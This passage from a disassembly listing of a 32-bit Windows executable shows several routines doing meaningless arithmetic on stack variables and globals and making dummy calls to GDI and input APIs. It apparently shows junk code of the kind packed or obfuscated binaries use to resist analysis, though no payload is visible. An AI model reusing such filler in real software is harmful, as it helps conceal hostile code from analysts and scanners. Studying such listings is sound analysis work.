		sub	edx, [ebp-0B4h]
		sub	edx, [ebp-0E4h]
		mov	[ebp-98h], edx
		mov	eax, [ebp-11Ch]
		push	eax
		call	sub_4098E0
		add	esp, 4
		mov	ecx, 50h
		sub	ecx, eax
		sub	ecx, [ebp-1B8h]
		or	ecx, [ebp-104h]
		mov	[ebp-90h], cx
		movzx	edx, byte ptr [ebp-7]
		mov	eax, 0FFFFFFCBh
		sub	eax, edx
		add	eax, 61h
		mov	[ebp-114h], ax
		mov	ecx, [ebp-11Ch]
		mov	[ebp-11Ch], ecx
		movzx	edx, word ptr [ebp-0D4h]
		mov	eax, [ebp-0E4h]
		lea	ecx, [edx+eax+25h]
		sub	ecx, [ebp-1BCh]
		mov	[ebp-114h], cx
		mov	edx, [ebp-0E4h]
		mov	eax, [ebp-1BCh]
		lea	ecx, [eax+edx-0Fh]
		add	ecx, [ebp-104h]
		mov	[ebp-0CCh], cx
		mov	edx, [ebp-0A4h]
		add	edx, 0ABh
		mov	[ebp-114h], dx
		mov	eax, [ebp-1BCh]
		push	eax
		push	10h
		mov	ecx, [ebp-104h]
		push	ecx
		call	ds:GdiComment
		mov	edx, 0FFFFFFC0h
		sub	edx, eax
		mov	[ebp-23Ch], edx
		mov	eax, [ebp-1A0h]
		add	eax, [ebp-98h]
		mov	[ebp-1BCh], eax
		mov	dword ptr [ebp-258h], 0
		jmp	short loc_40907D
; ---------------------------------------------------------------------------

loc_40906E:				; CODE XREF: .text:00409142j
		mov	ecx, [ebp-258h]
		add	ecx, 1
		mov	[ebp-258h], ecx

loc_40907D:				; CODE XREF: .text:0040906Cj
		cmp	dword ptr [ebp-258h], 0Ch
		jge	loc_409147
		mov	edx, 10h
		sub	edx, [ebp-104h]
		add	edx, [ebp-120h]
		mov	[ebp-23Ch], edx
		movzx	eax, word ptr [ebp-9Bh]
		mov	[ebp-120h], eax
		mov	esi, [ebp-120h]
		sub	esi, [ebp-0E4h]
		mov	ecx, [ebp-104h]
		push	ecx
		mov	edx, [ebp-0E4h]
		push	edx
		call	sub_408650
		add	esp, 8
		lea	eax, [esi+eax-4Bh]
		mov	[ebp-14h], ax
		mov	ecx, [ebp-1B8h]
		add	ecx, [ebp-0C8h]
		mov	edx, [ebp-104h]
		lea	eax, [ecx+edx-26h]
		movzx	ecx, byte ptr [ebp-1Ah]
		sub	eax, ecx
		mov	[ebp-115h], al
		mov	edx, 50h
		sub	edx, [ebp-1B8h]
		add	edx, 52h
		sub	edx, [ebp-1BCh]
		mov	[ebp-0D0h], dx
		movzx	eax, byte ptr [ebp-7]
		mov	ecx, 2Bh
		sub	ecx, eax
		movzx	edx, byte ptr [ebp-0FDh]
		or	ecx, edx
		movzx	eax, byte ptr [ebp-115h]
		sub	eax, ecx
		mov	[ebp-115h], al
		mov	dword ptr [ebp-11Ch], 36h
		jmp	loc_40906E
; ---------------------------------------------------------------------------

loc_409147:				; CODE XREF: .text:00409084j
		movzx	ecx, word ptr [ebp-0ECh]
		mov	edx, dword_42C050
		sub	edx, ecx
		mov	dword_42C050, edx
		movzx	eax, byte ptr [ebp-0FDh]
		sub	eax, [ebp-1B8h]
		movzx	ecx, byte ptr [ebp-115h]
		sub	eax, ecx
		mov	[ebp-0A4h], eax
		movzx	edx, byte ptr [ebp-6]
		mov	eax, [ebp-1B0h]
		sub	eax, lpExitCode
		and	edx, eax
		mov	[ebp-8Ch], edx
		mov	ecx, dword_42C00C
		cmp	ecx, [ebp-1B8h]
		jl	short loc_4091D2
		mov	edx, [ebp-0C8h]
		add	edx, 24h
		movzx	eax, word ptr [ebp-0B8h]
		sub	edx, eax
		sub	edx, dword_42C024
		add	edx, Wow64Process
		mov	[ebp-115h], dl
		movzx	ecx, byte ptr [ebp-116h]
		add	ecx, 51h
		and	ecx, 5Eh
		mov	[ebp-1Ah], cl

loc_4091D2:				; CODE XREF: .text:0040919Cj
		mov	edx, y
		mov	[ebp-154h], edx
		mov	eax, 5Dh
		sub	eax, lpExitCode
		movzx	ecx, byte ptr [ebp-116h]
		or	eax, ecx
		mov	[ebp-1B0h], eax
		mov	edx, 40h
		sub	edx, dword_42C024
		mov	[ebp-0A4h], edx
		push	2Ah
		push	37h
		call	ds:CopyEnhMetaFileW
		mov	Wow64Process, eax
		mov	eax, lpExitCode
		add	eax, 26h
		sub	eax, [ebp-0A8h]
		mov	[ebp-0B4h], eax
		mov	ecx, Wow64Process
		sub	ecx, lpExitCode
		and	ecx, [ebp-0A4h]
		or	ecx, [ebp-23Ch]
		mov	[ebp-244h], cx
		movzx	edx, byte ptr [ebp-0D5h]
		add	edx, 16h
		movzx	eax, word ptr [ebp-0C4h]
		sub	eax, edx
		mov	[ebp-0C4h], ax
		mov	ecx, dword_42C024
		sub	ecx, lpExitCode
		mov	Wow64Process, ecx
		mov	edx, [ebp-104h]
		mov	[ebp-168h], edx
		mov	dword ptr [ebp-104h], 0FFFFFFFEh
		movzx	eax, byte ptr [ebp-115h]
		add	eax, [ebp-0B4h]
		mov	ecx, [ebp-238h]
		lea	edx, [eax+ecx-36h]
		mov	[ebp-0B8h], dx
		mov	eax, [ebp-1A0h]
		mov	[ebp-11Ch], eax
		mov	ecx, [ebp-1B0h]
		add	ecx, 2Ch
		mov	[ebp-0A4h], ecx
		mov	edx, dword_42C024
		sub	edx, 3Dh
		xor	edx, lpExitCode
		mov	[ebp-1A0h], edx
		call	ds:GetDesktopWindow
		and	eax, 3Dh
		mov	hdc, eax
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4092F0	proc near		; CODE XREF: sub_408140+F7p
					; sub_409DF0+D4Bp

var_270		= dword	ptr -270h
var_26C		= dword	ptr -26Ch
var_268		= dword	ptr -268h
var_264		= dword	ptr -264h
var_258		= dword	ptr -258h
var_250		= word ptr -250h
var_24C		= dword	ptr -24Ch
var_248		= dword	ptr -248h
var_1CC		= word ptr -1CCh
var_1C1		= byte ptr -1C1h
var_1C0		= dword	ptr -1C0h
var_1B5		= byte ptr -1B5h
var_1B4		= word ptr -1B4h
var_1B0		= dword	ptr -1B0h
var_1AC		= word ptr -1ACh
var_1A8		= word ptr -1A8h
var_19C		= word ptr -19Ch
var_184		= dword	ptr -184h
var_174		= dword	ptr -174h
var_12C		= dword	ptr -12Ch
var_128		= dword	ptr -128h
var_122		= byte ptr -122h
var_120		= word ptr -120h
var_11C		= dword	ptr -11Ch
var_110		= dword	ptr -110h
var_10A		= byte ptr -10Ah
var_109		= byte ptr -109h
var_108		= word ptr -108h
var_100		= dword	ptr -100h
var_F0		= dword	ptr -0F0h
var_EC		= dword	ptr -0ECh
var_E4		= word ptr -0E4h
var_E0		= word ptr -0E0h
var_D8		= dword	ptr -0D8h
var_CC		= dword	ptr -0CCh
var_C0		= dword	ptr -0C0h
var_B8		= dword	ptr -0B8h
var_B4		= dword	ptr -0B4h
var_AC		= dword	ptr -0ACh
var_A8		= dword	ptr -0A8h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
var_91		= byte ptr -91h
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_6E		= byte ptr -6Eh
var_3C		= dword	ptr -3Ch
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= word ptr -18h
var_14		= word ptr -14h
var_C		= word ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= byte ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 270h
		movzx	eax, [ebp+var_18]
		sub	eax, [ebp+var_B4]
		sub	eax, 5Ch
		or	eax, [ebp+var_EC]
		mov	[ebp+var_108], ax
		mov	ecx, [ebp+var_110]
		mov	[ebp+var_3C], ecx
		mov	edx, [ebp+arg_0]
		add	edx, 9
		mov	[ebp+var_E4], dx
		mov	eax, [ebp+var_CC]
		mov	[ebp+var_26C], eax
		cmp	[ebp+var_26C], 0
		jz	short loc_409350
		cmp	[ebp+var_26C], 1
		jz	loc_4093D2
		jmp	loc_409440
; ---------------------------------------------------------------------------

loc_409350:				; CODE XREF: sub_4092F0+4Cj
		mov	ecx, [ebp+var_110]
		mov	[ebp+var_B4], ecx
		movzx	edx, [ebp+var_120]
		add	edx, 31h
		or	edx, 36h
		movzx	eax, [ebp+var_90]
		add	eax, edx
		mov	[ebp+var_90], ax
		mov	ecx, dword_42C004
		cmp	ecx, [ebp+var_264]
		jz	short loc_4093B7
		movzx	edx, [ebp+var_18]
		mov	eax, [ebp+arg_0]
		sub	eax, 44h
		movzx	ecx, [ebp+var_10A]
		sub	eax, ecx
		or	edx, eax
		mov	[ebp+var_1A8], dx
		mov	edx, 59h
		sub	edx, [ebp+var_B4]
		sub	edx, 21h
		mov	[ebp+var_100], edx

loc_4093B7:				; CODE XREF: sub_4092F0+95j
		movzx	eax, [ebp+var_1A8]
		movzx	ecx, [ebp+var_1B5]
		sub	eax, ecx
		mov	[ebp+var_EC], eax
		jmp	loc_40946C
; ---------------------------------------------------------------------------

loc_4093D2:				; CODE XREF: sub_4092F0+55j
		mov	edx, [ebp+var_D8]
		mov	eax, [ebp+var_20]
		lea	ecx, [eax+edx-62h]
		sub	ecx, [ebp+var_A8]
		add	ecx, [ebp+var_B4]
		mov	[ebp+var_1C1], cl
		cmp	dword_42C000, 5Dh
		jle	short loc_409414
		mov	[ebp+arg_0], 4Ah
		movzx	edx, [ebp+var_91]
		add	edx, 54h
		or	edx, 52h
		mov	[ebp+var_C0], edx

loc_409414:				; CODE XREF: sub_4092F0+108j
		mov	eax, 1Ah
		sub	eax, [ebp+arg_10]
		movzx	ecx, [ebp+var_108]
		xor	eax, ecx
		mov	[ebp+var_F0], eax
		mov	edx, [ebp+var_20]
		add	edx, 0Eh
		sub	edx, [ebp+var_11C]
		mov	[ebp+var_108], dx
		jmp	short loc_40946C
; ---------------------------------------------------------------------------

loc_409440:				; CODE XREF: sub_4092F0+5Bj
		mov	eax, [ebp+var_128]
		push	eax
		mov	ecx, [ebp+var_CC]
		push	ecx
		mov	edx, [ebp+var_20]
		push	edx
		mov	eax, [ebp+var_20]
		push	eax
		mov	ecx, [ebp+var_20]
		push	ecx
		call	sub_410210
		add	esp, 14h
		mov	edx, 15h
		sub	edx, eax
		mov	[ebp+arg_10], edx

loc_40946C:				; CODE XREF: sub_4092F0+DDj
					; sub_4092F0+14Ej
		mov	eax, 0FFFFFFC8h
		sub	eax, [ebp+arg_8]
		mov	[ebp+var_8C], eax
		mov	[ebp+var_268], 0
		jmp	short loc_409495
; ---------------------------------------------------------------------------

loc_409486:				; CODE XREF: sub_4092F0+225j
		mov	ecx, [ebp+var_268]
		add	ecx, 1
		mov	[ebp+var_268], ecx

loc_409495:				; CODE XREF: sub_4092F0+194j
		cmp	[ebp+var_268], 8
		jge	short loc_40951A
		mov	edx, [ebp+var_F0]
		mov	[ebp+arg_8], edx
		movzx	eax, [ebp+var_18]
		add	eax, [ebp+arg_10]
		mov	ecx, [ebp+var_8C]
		lea	edx, [ecx+eax+30h]
		mov	[ebp+var_108], dx
		movzx	eax, [ebp+var_19]
		mov	ecx, 39h
		sub	ecx, eax
		add	ecx, dword_42C040
		mov	dword_42C040, ecx
		mov	edx, [ebp+var_110]
		add	edx, 74h
		or	edx, 39h
		mov	[ebp+var_1A], dl
		movzx	eax, [ebp+var_122]
		movzx	ecx, [ebp+var_19C]
		sub	eax, ecx
		add	eax, [ebp+arg_0]
		movzx	edx, [ebp+var_250]
		xor	edx, eax
		mov	[ebp+var_250], dx
		movzx	eax, [ebp+var_120]
		mov	[ebp+var_9C], eax
		jmp	loc_409486
; ---------------------------------------------------------------------------

loc_40951A:				; CODE XREF: sub_4092F0+1ACj
		movzx	ecx, [ebp+var_1AC]
		add	ecx, 29h
		movzx	edx, [ebp+var_1B4]
		sub	ecx, edx
		movzx	eax, [ebp+var_C]
		add	eax, ecx
		mov	[ebp+var_C], ax
		mov	ecx, [ebp+var_1B0]
		xor	ecx, [ebp+var_248]
		mov	[ebp+var_20], ecx
		mov	edx, [ebp+var_CC]
		mov	[ebp+var_12C], edx
		movzx	eax, [ebp+var_1C1]
		sub	eax, 1
		xor	eax, 71h
		mov	[ebp+var_E0], ax
		mov	ecx, [ebp+var_EC]
		push	ecx
		mov	edx, [ebp+var_9C]
		push	edx
		mov	eax, [ebp+var_B4]
		push	eax
		mov	ecx, [ebp+var_128]
		push	ecx
		mov	edx, [ebp+var_B4]
		push	edx
		mov	eax, [ebp+var_258]
		push	eax
		call	sub_40EB80
		add	esp, 18h
		sub	eax, [ebp+arg_8]
		movzx	ecx, [ebp+var_1A]
		add	eax, ecx
		and	eax, 5Dh
		mov	[ebp+var_18], ax
		mov	edx, dword_42C038
		sub	edx, 46h
		mov	dword_42C038, edx
		mov	eax, [ebp+arg_4]
		push	eax
		mov	ecx, [ebp+arg_4]
		push	ecx
		call	sub_4097A0
		add	esp, 8
		movzx	edx, [ebp+var_109]
		sub	eax, edx
		mov	[ebp+var_258], eax
		mov	eax, [ebp+var_B4]
		sub	eax, 12h
		xor	eax, [ebp+var_110]
		mov	[ebp+var_4], eax
		mov	ecx, [ebp+var_CC]
		mov	[ebp+arg_0], ecx
		call	ds:GetInputState
		add	eax, 0D6h
		sub	eax, [ebp+var_CC]
		mov	[ebp+var_19], al
		mov	edx, [ebp+var_258]
		mov	[ebp+var_B4], edx
		mov	[ebp+var_174], 31h
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_20], eax
		mov	ecx, [ebp+var_B4]
		add	ecx, 49h
		movzx	edx, [ebp+var_108]
		sub	ecx, edx
		mov	[ebp+var_AC], ecx
		lea	eax, [ebp+arg_C]
		sub	eax, 0Ah
		movzx	ecx, word ptr [eax]
		mov	[ebp+var_12C], ecx
		mov	[ebp+var_184], 24h
		mov	edx, [ebp+var_1B0]
		and	edx, 3Dh
		mov	[ebp+arg_4], edx
		mov	eax, [ebp+var_20]
		mov	[ebp+var_270], eax
		cmp	[ebp+var_270], 3 ; switch 4 cases
		ja	loc_409736	; jumptable 0040967A default case
		mov	ecx, [ebp+var_270]
		jmp	ds:off_409790[ecx*4] ; switch jump
; ---------------------------------------------------------------------------

loc_409681:				; CODE XREF: sub_4092F0+38Aj
					; DATA XREF: .text:off_409790o
		mov	edx, dword_42C050 ; jumptable 0040967A case 0
		imul	edx, 97h
		mov	dword_42C050, edx
		cmp	[ebp+var_B8], 4Bh
		jl	short loc_4096BA
		movzx	eax, [ebp+var_14]
		mov	ecx, 54h
		sub	ecx, eax
		sub	ecx, [ebp+arg_10]
		mov	[ebp+var_A8], ecx
		mov	[ebp+var_258], 46h

loc_4096BA:				; CODE XREF: sub_4092F0+3AAj
		jmp	short loc_409736 ; jumptable 0040967A default case
; ---------------------------------------------------------------------------

loc_4096BC:				; CODE XREF: sub_4092F0+38Aj
					; DATA XREF: .text:off_409790o
		mov	edx, [ebp+var_12C] ; jumptable 0040967A	case 1
		mov	dword_42C04C, edx
		cmp	[ebp+var_24C], 62h
		ja	short loc_409703
		movzx	eax, [ebp+var_10A]
		mov	ecx, 29h
		sub	ecx, eax
		add	ecx, 1Bh
		sub	ecx, [ebp+var_110]
		mov	[ebp+var_1CC], cx
		mov	edx, [ebp+var_1C0]
		sub	edx, 58h
		xor	edx, 63h
		mov	[ebp+var_98], edx
		jmp	short loc_409713
; ---------------------------------------------------------------------------

loc_409703:				; CODE XREF: sub_4092F0+3DFj
		mov	[ebp+arg_10], 30h
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_EC], eax

loc_409713:				; CODE XREF: sub_4092F0+411j
		jmp	short loc_409736 ; jumptable 0040967A default case
; ---------------------------------------------------------------------------

loc_409715:				; CODE XREF: sub_4092F0+38Aj
					; DATA XREF: .text:off_409790o
		mov	[ebp+var_110], 34h ; jumptable 0040967A	case 2
		jmp	short loc_409736 ; jumptable 0040967A default case
; ---------------------------------------------------------------------------

loc_409721:				; CODE XREF: sub_4092F0+38Aj
					; DATA XREF: .text:off_409790o
		mov	ecx, [ebp+var_9C] ; jumptable 0040967A case 3
		mov	[ebp+arg_0], ecx
		mov	edx, 69h
		mov	[ebp+var_250], dx

loc_409736:				; CODE XREF: sub_4092F0+37Ej
					; sub_4092F0:loc_4096BAj ...
		movzx	eax, [ebp+var_6E] ; jumptable 0040967A default case
		mov	[ebp+arg_10], eax
		movzx	ecx, [ebp+var_1A8]
		movzx	edx, [ebp+var_1C1]
		add	ecx, edx
		or	ecx, [ebp+arg_0]
		mov	[ebp+var_11C], ecx
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+arg_10]
		lea	edx, [ecx+eax-4Bh]
		movzx	eax, [ebp+var_1C1]
		sub	edx, eax
		mov	[ebp+var_E0], dx
		movzx	ecx, [ebp+var_109]
		mov	edx, dword_42C034
		sub	edx, ecx
		mov	dword_42C034, edx
		mov	eax, [ebp+var_B4]
		mov	esp, ebp
		pop	ebp
		retn
sub_4092F0	endp

; ---------------------------------------------------------------------------
		align 10h
off_409790	dd offset loc_409681	; DATA XREF: sub_4092F0+38Ar
		dd offset loc_4096BC	; jump table for switch	statement
		dd offset loc_409715
		dd offset loc_409721

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4097A0	proc near		; CODE XREF: sub_4092F0+2CFp

var_230		= word ptr -230h
var_1AC		= word ptr -1ACh
var_19C		= byte ptr -19Ch
var_194		= word ptr -194h
var_10C		= dword	ptr -10Ch
var_105		= byte ptr -105h
var_F6		= byte ptr -0F6h
var_F5		= byte ptr -0F5h
var_F4		= word ptr -0F4h
var_DD		= byte ptr -0DDh
var_D8		= dword	ptr -0D8h
var_D1		= byte ptr -0D1h
var_D0		= word ptr -0D0h
var_CC		= word ptr -0CCh
var_8C		= dword	ptr -8Ch
var_74		= dword	ptr -74h
var_38		= dword	ptr -38h
var_C		= dword	ptr -0Ch
var_6		= byte ptr -6
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 240h
		movzx	eax, [ebp+var_D1]
		add	eax, 5Fh
		movzx	ecx, [ebp+var_230]
		or	ecx, eax
		mov	[ebp+var_230], cx
		movzx	edx, byte ptr [ebp+arg_0]
		mov	[ebp+var_10C], edx
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_38], eax
		mov	[ebp+arg_0], 3Fh
		movzx	ecx, [ebp+var_DD]
		imul	ecx, dword_42C034
		mov	dword_42C034, ecx
		movzx	edx, [ebp+var_1AC]
		sub	edx, [ebp+var_D8]
		mov	[ebp+var_C], edx
		movzx	eax, [ebp+var_F5]
		mov	ecx, [ebp+var_C]
		lea	edx, [eax+ecx+45h]
		mov	[ebp+var_8C], edx
		movzx	eax, [ebp+var_D0]
		add	eax, 22h
		sub	eax, [ebp+var_C]
		and	eax, [ebp+var_C]
		mov	[ebp+var_CC], ax
		mov	ecx, [ebp+var_10C]
		push	ecx
		mov	edx, [ebp+var_D8]
		push	edx
		call	sub_40F9D0
		add	esp, 8
		add	eax, [ebp+arg_0]
		mov	[ebp+var_10C], eax
		movzx	eax, [ebp+var_194]
		add	eax, 0CBh
		mov	[ebp+var_F4], ax
		movzx	ecx, [ebp+var_105]
		add	ecx, 0Ah
		and	ecx, 2Dh
		mov	[ebp+var_194], cx
		lea	edx, [ebp+var_19C]
		sub	edx, 23h
		movzx	eax, byte ptr [edx]
		mov	[ebp+var_C], eax
		mov	[ebp+var_74], 53h
		movzx	ecx, [ebp+var_F6]
		add	ecx, dword_42C058
		mov	dword_42C058, ecx
		mov	[ebp+arg_0], 8
		movzx	edx, [ebp+var_6]
		movzx	eax, [ebp+var_CC]
		sub	edx, eax
		movzx	ecx, [ebp+var_1AC]
		sub	ecx, edx
		mov	[ebp+var_1AC], cx
		mov	edx, 0Ch
		sub	edx, [ebp+arg_0]
		mov	[ebp+arg_0], edx
		mov	eax, [ebp+var_10C]
		mov	esp, ebp
		pop	ebp
		retn
sub_4097A0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4098E0	proc near		; CODE XREF: sub_402520+DEp
					; .text:00408F9Cp

var_239		= byte ptr -239h
var_230		= word ptr -230h
var_1B0		= dword	ptr -1B0h
var_1AC		= word ptr -1ACh
var_1A5		= byte ptr -1A5h
var_194		= word ptr -194h
var_10E		= byte ptr -10Eh
var_100		= dword	ptr -100h
var_FA		= byte ptr -0FAh
var_DD		= byte ptr -0DDh
var_DC		= dword	ptr -0DCh
var_D4		= word ptr -0D4h
var_CC		= word ptr -0CCh
var_B8		= word ptr -0B8h
var_B4		= dword	ptr -0B4h
var_98		= dword	ptr -98h
var_84		= dword	ptr -84h
var_74		= dword	ptr -74h
var_1A		= byte ptr -1Ah
var_10		= dword	ptr -10h
var_6		= byte ptr -6
var_5		= byte ptr -5
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 23Ch
		mov	eax, [ebp+var_100]
		mov	[ebp+var_84], eax
		movzx	ecx, [ebp+var_FA]
		add	ecx, 27h
		mov	[ebp+var_100], ecx
		mov	edx, [ebp+arg_0]
		mov	[ebp+arg_0], edx
		mov	[ebp+var_100], 92h
		mov	[ebp+var_98], 4Fh
		movzx	eax, [ebp+var_CC]
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+var_DC]
		add	ecx, [ebp+arg_0]
		mov	edx, [ebp+var_1B0]
		add	edx, 63h
		sub	edx, [ebp+var_98]
		xor	ecx, edx
		mov	[ebp+var_FA], cl
		movzx	eax, [ebp+var_B8]
		add	eax, [ebp+arg_0]
		mov	[ebp+var_194], ax
		mov	ecx, 50h
		sub	ecx, [ebp+var_10]
		movzx	edx, [ebp+var_DD]
		sub	ecx, edx
		movzx	eax, [ebp+var_FA]
		xor	ecx, eax
		mov	[ebp+var_D4], cx
		mov	[ebp+var_74], 14h
		movzx	ecx, [ebp+var_1A]
		add	ecx, [ebp+var_98]
		and	ecx, 58h
		mov	[ebp+var_B4], ecx
		mov	edx, [ebp+arg_0]
		push	edx
		mov	eax, [ebp+var_100]
		push	eax
		mov	ecx, [ebp+var_100]
		push	ecx
		mov	edx, [ebp+var_98]
		push	edx
		mov	eax, [ebp+var_100]
		push	eax
		call	sub_410210
		add	esp, 14h
		sub	eax, 44h
		mov	[ebp+var_100], eax
		movzx	ecx, [ebp+var_1AC]
		mov	edx, 1Fh
		sub	edx, ecx
		movzx	eax, [ebp+var_239]
		add	edx, eax
		movzx	ecx, [ebp+var_D4]
		sub	edx, ecx
		mov	[ebp+var_230], dx
		movzx	edx, [ebp+var_10E]
		mov	eax, 5Bh
		sub	eax, edx
		mov	ecx, dword_42C050
		sub	ecx, eax
		mov	dword_42C050, ecx
		movzx	edx, [ebp+var_6]
		movzx	eax, [ebp+var_5]
		xor	eax, edx
		mov	[ebp+var_5], al
		mov	ecx, [ebp+arg_0]
		and	ecx, 3Fh
		movzx	edx, [ebp+var_1A5]
		add	edx, ecx
		mov	[ebp+var_1A5], dl
		mov	eax, [ebp+var_100]
		mov	esp, ebp
		pop	ebp
		retn
sub_4098E0	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 268h
		mov	eax, [ebp-94h]
		mov	ecx, [ebp-114h]
		lea	edx, [ecx+eax+24h]
		xor	edx, 57h
		mov	[ebp-108h], dx
		movzx	eax, word ptr [ebp-108h]
		mov	ecx, 4Bh
		sub	ecx, eax
		add	ecx, [ebp+0Ch]
		mov	[ebp-254h], ecx
		mov	dword ptr [ebp-0Ch], 54h
		mov	edx, 25h
		mov	[ebp-1C8h], dx
		mov	dword ptr [ebp-48h], 10h
		mov	byte ptr [ebp-7], 32h
		movzx	eax, byte ptr [ebp-6]
		add	eax, 52h
		mov	[ebp-0ACh], eax
		mov	ecx, [ebp-24h]
		and	ecx, 4Ch
		mov	[ebp-268h], ecx
		movzx	edx, byte ptr [ebp-0E1h]
		add	edx, [ebp-268h]
		mov	eax, [ebp-24h]
		lea	ecx, [edx+eax-0A6h]
		mov	[ebp-0E1h], cl
		mov	edx, [ebp-0Ch]
		mov	[ebp+10h], edx
		movzx	eax, word ptr [ebp-1A4h]
		add	eax, 3Dh
		mov	dword_42C03C, eax
		movzx	ecx, word ptr [ebp-18h]
		add	ecx, 9
		movzx	edx, word ptr [ebp-108h]
		sub	ecx, edx
		movzx	eax, word ptr [ebp-1A0h]
		sub	eax, ecx
		mov	[ebp-1A0h], ax
		mov	eax, [ebp-1D0h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409B10	proc near		; CODE XREF: sub_409DF0+24Ep
					; sub_40F3D0+60p

var_268		= dword	ptr -268h
var_260		= dword	ptr -260h
var_258		= word ptr -258h
var_248		= word ptr -248h
var_238		= dword	ptr -238h
var_1D4		= dword	ptr -1D4h
var_1C1		= byte ptr -1C1h
var_1C0		= dword	ptr -1C0h
var_1B4		= word ptr -1B4h
var_1A4		= word ptr -1A4h
var_1A0		= word ptr -1A0h
var_148		= dword	ptr -148h
var_12C		= dword	ptr -12Ch
var_128		= dword	ptr -128h
var_114		= dword	ptr -114h
var_110		= dword	ptr -110h
var_ED		= byte ptr -0EDh
var_DD		= byte ptr -0DDh
var_DC		= word ptr -0DCh
var_D8		= word ptr -0D8h
var_D0		= dword	ptr -0D0h
var_C1		= byte ptr -0C1h
var_B4		= word ptr -0B4h
var_A0		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_38		= dword	ptr -38h
var_24		= dword	ptr -24h
var_1D		= byte ptr -1Dh
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		push	ebx
		mov	eax, 97h
		mov	[ebp+var_1A4], ax
		mov	ecx, [ebp+arg_10]
		sub	ecx, [ebp+var_110]
		mov	edx, [ebp+var_128]
		lea	eax, [ecx+edx+33h]
		and	eax, 47h
		mov	[ebp+var_5], al
		mov	cx, [ebp+var_248]
		mov	[ebp+var_D8], cx
		mov	[ebp+var_38], 18h
		mov	[ebp+var_128], 2Bh
		mov	edx, [ebp+var_D0]
		mov	eax, [ebp+var_268]
		lea	ecx, [eax+edx+2Ch]
		movzx	edx, [ebp+var_258]
		add	ecx, edx
		and	ecx, [ebp+var_260]
		mov	[ebp+var_ED], cl
		mov	eax, dword_42C00C
		cmp	eax, [ebp+var_114]
		jl	short loc_409BA6
		movzx	ecx, [ebp+var_DC]
		add	ecx, [ebp+var_A0]
		add	ecx, [ebp+var_24]
		mov	[ebp+var_D0], ecx

loc_409BA6:				; CODE XREF: sub_409B10+7Ej
		mov	edx, [ebp+var_128]
		add	edx, 3Fh
		or	edx, 0A5h
		mov	[ebp+var_B4], dx
		mov	ebx, [ebp+var_12C]
		add	ebx, 3Ch
		mov	eax, [ebp+var_260]
		push	eax
		mov	ecx, [ebp+var_128]
		push	ecx
		call	sub_4100E0
		add	esp, 8
		sub	eax, 43h
		or	ebx, eax
		mov	[ebp+var_5], bl
		mov	[ebp+var_238], 3Bh
		movzx	edx, [ebp+var_1C1]
		mov	[ebp+arg_0], edx
		movzx	eax, [ebp+var_DD]
		mov	[ebp+var_110], eax
		mov	ecx, [ebp+arg_14]
		add	ecx, [ebp+var_1C0]
		mov	[ebp+arg_14], ecx
		mov	edx, [ebp+var_260]
		mov	[ebp+var_148], edx
		movzx	eax, [ebp+var_C1]
		movzx	ecx, [ebp+var_99]
		sub	eax, ecx
		mov	edx, [ebp+var_24]
		add	edx, [ebp+var_110]
		and	eax, edx
		mov	[ebp+var_1B4], ax
		mov	eax, [ebp+arg_4]
		add	eax, 1Eh
		mov	[ebp+var_24], eax
		movzx	ecx, [ebp+var_ED]
		mov	edx, [ebp+var_128]
		sub	edx, ecx
		xor	edx, 93h
		mov	[ebp+var_258], dx
		mov	eax, [ebp+var_1D4]
		add	eax, 10h
		mov	ecx, [ebp+arg_C]
		add	ecx, 64h
		sub	ecx, [ebp+var_24]
		and	eax, ecx
		mov	[ebp+var_1D], al
		movzx	edx, [ebp+var_1A0]
		and	edx, 0Dh
		add	edx, dword_42C048
		mov	dword_42C048, edx
		mov	eax, [ebp+arg_0]
		add	eax, 24h
		mov	[ebp+var_128], eax
		mov	eax, [ebp+var_110]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_409B10	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		mov	eax, 27h
		sub	eax, [ebp-0Ch]
		movzx	ecx, word ptr [ebp-0C0h]
		lea	edx, [eax+ecx+10h]
		or	edx, 4Bh
		mov	[ebp-0E1h], dl
		mov	dword ptr [ebp-0B4h], 0Dh
		movzx	eax, byte ptr [ebp-105h]
		add	eax, [ebp-0BCh]
		movzx	ecx, byte ptr [ebp-5]
		sub	eax, ecx
		mov	[ebp-0ACh], eax
		mov	edx, [ebp-1B8h]
		mov	eax, [ebp-0B4h]
		lea	ecx, [eax+edx+6]
		mov	[ebp-0A0h], ecx
		mov	edx, [ebp-0Ch]
		mov	[ebp-0F0h], edx
		mov	eax, [ebp-0C8h]
		add	eax, 4Eh
		mov	[ebp+8], eax
		movzx	ecx, word ptr [ebp-230h]
		mov	edx, 0Eh
		sub	edx, ecx
		xor	edx, 5Ah
		movzx	eax, word ptr [ebp-230h]
		sub	eax, edx
